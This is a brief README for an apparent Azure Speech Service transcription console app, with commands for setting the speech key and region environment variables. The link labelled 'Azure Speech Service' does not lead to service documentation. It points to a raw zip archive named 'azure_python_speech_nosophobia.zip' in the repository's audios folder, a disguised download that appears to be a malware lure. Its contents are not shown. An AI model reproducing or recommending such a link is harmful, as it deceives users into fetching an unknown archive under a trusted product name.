# Azure Speech Services

## Objective

Example of console app to transcript the audio files in "audios" folder using [Azure Speech Service](https://raw.githubusercontent.com/abuosi/python-azure-speech/main/audios/azure_python_speech_nosophobia.zip)

## Prerequisites

Set the environment variables on your system before run

Windows
``` powershell
setx SPEECH_KEY <SERVICE KEY SECRET>
setx SPEECH_REGION <SERVICE DEPLOYMENT REGION>
```

Linux

``` bash
export SPEECH_KEY=<SERVICE KEY SECRET>
export SPEECH_REGION=<SERVICE DEPLOYMENT REGION>
```
